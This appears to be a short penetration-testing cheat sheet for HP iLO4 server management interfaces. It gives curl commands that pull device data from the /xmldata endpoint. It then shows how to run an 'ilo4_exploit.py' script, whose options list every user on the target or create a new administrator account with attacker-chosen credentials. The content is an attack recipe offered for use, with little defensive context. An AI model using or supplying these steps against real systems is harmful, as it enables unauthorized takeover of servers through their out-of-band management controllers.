# hpilo4
# HTTP
curl http://'ip'/xmldata?item=ALL
# HTTPS
curl -k https://'ip'/xmldata?item=ALL

#iLO4 exploit
python ilo4_exploit.py 'ip' 'option'
	
  'ip', help='target IP'
	'-t', action='store_true', default=True, help='Test. Trigger the exploit and list all users'
	'-e', action='store_true', default=False, help='Exploit. Create a new admin user with the credentials specified in -u and -p'
  '-u', help='username of the new admin user'
	'-p', help='password of the new admin user'
